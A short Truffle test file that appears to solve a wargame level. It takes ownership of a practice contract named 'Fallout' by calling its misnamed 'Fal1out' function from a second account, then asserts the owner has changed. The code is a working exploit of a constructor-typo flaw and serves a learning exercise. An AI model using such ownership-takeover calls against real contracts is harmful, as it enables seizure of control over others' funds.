const Fallout = artifacts.require("Fallout");
  
contract('Fallout', (accounts) => {
  it('Claim ownership', async () => {
    const accountOne = accounts[0];
    const accountTwo = accounts[1];

    const instance = await Fallout.deployed();

    await instance.Fal1out({value: 1, from: accountTwo});
    //await instance.sendTransaction({value: 1, from: accountTwo});

    const owner = await instance.owner();
    assert.equal(owner, accountTwo, "Owner account was changed!");

  });
});

